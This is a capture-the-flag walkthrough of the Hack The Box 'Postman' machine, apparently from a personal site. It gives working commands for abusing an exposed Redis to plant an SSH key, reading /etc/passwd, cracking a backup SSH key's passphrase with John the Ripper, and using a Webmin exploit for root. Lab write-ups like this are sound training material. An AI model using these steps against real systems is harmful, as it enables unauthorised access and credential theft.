---
layout: walkthrough
title: Postman
description: HTB walkthrough
logo: /assets/img/walkthroughs/postman_logo.png
show-avatar: false
permalink: /walkthroughs/postman.html
OS: Linux
difficulty: Easy
release: 2 Nov 2019
creator: <a href="https://www.hackthebox.eu/home/users/profile/114053">TheCyberGeek</a>
cleared: 9 Nov 2019
publiished: 2019 11 09
---

<h2 align="center">Enumeration</h2>

Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Fri Nov  8 21:44:03 2019 as: nmap -sC -sV -p- -Pn -oN nmapscan.txt 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.088s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  8 21:50:09 2019 -- 1 IP address (1 host up) scanned in 366.53 seconds

```

We see a number of open ports. Checking what is on port 80 with our browser doesn't show us much of interest

![Cyber Geek](/assets/img/walkthroughs/postman_webpage.png)

Checking searchsploit for webmin 1.910 we see that there is an RCE with root privileges as detailed by CVE-2019-12840

https://www.cvedetails.com/cve/CVE-2019-12840/

however that requires a credentialed user, which we don't have. If we turn our attention to the redis instance running on port 6379 tho, we see that if we can access it, it is vulnerable to this exploit

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

So lets check

```
root@kali:~/HTB/Boxes/Postman# telnet 10.10.10.160 6379
Trying 10.10.10.160...
Connected to 10.10.10.160.
Escape character is '^]'.
echo "HILBERT"
$7
HILBERT
```

Bingo! So our plan now is to try and write our SSH key onto the server and login. We need to add some whitespace to our key and then write that into Redis. We can use **redis-cli** for this. 

```
root@kali:~/HTB/Boxes/Postman# (echo -e "\n\n"; cat id_rsa_.pub echo -e "\n\n") > key.txt
root@kali:~/HTB/Boxes/Postman# redis-cli -h 10.10.10.160 flushall
OK
root@kali:~/HTB/Boxes/Postman# cat key.txt | redis-cli -h 10.10.10.160 -x set crackit
```

now we can logon to redis, and try and write our SSH key into a users .ssh folder. The default folder for redis is /var/lib/redis so if a .ssh folder has been created for redis user we can write to that.

```
root@kali:~/HTB/Boxes/Postman# redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

looks like it has bee. Now lets SSH in

```
root@kali:~/HTB/Boxes/Postman# ssh -i id_rsa_ redis@10.10.10.160
<...>
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$                
```

First lets cat the /etc/passwd file so we can get the other users

```
redis@Postman:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
<...>
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

 We don't have write access to /home/Matt/.ssh unfortunately so we can't duplicate our previous exploit to gain access to user Matt. Enumerating the machine further we find a backup of an SSH key.

```
redis@Postman:~$ ls /opt
id_rsa.bak
```

Lets copy this, and see if we can crack the password on it. To do this we will use a program called John the Ripper. First we need to convert the key into a suitable format. For this we will use **ssh2john**, then we can run john the ripper on it with a wordlist to try and crack it.

```
root@kali:~/HTB/Boxes/Postman# python /usr/share/john/ssh2john.py id_rsa.bak > id_rsa.hash
root@kali:~/HTB/Boxes/Postman# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
1g 0:00:00:12 DONE (2019-11-12 00:48) 0.07710g/s 1105Kp/s 1105Kc/s 1105KC/sa6_123..*7¡Vamos!
Session completed
```

We cracked the password, which is "computer2008". Let's see if we can login to Matt with this

```
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
517adXXXXXXXXXXXXXXXXXX08a2f3c
```

Success! We will also find that we can login to webmin on port 10000 with Matt:computer2008

<h3 align="center">On To Root</h3>

So now with valid credentials we can use CVE-2019-12840 which has a metasploit module. Make sure to set SSL to true as port 10000 is using https

![root](/assets/img/walkthroughs/postman_root.png)

we can now access the root.txt flag.
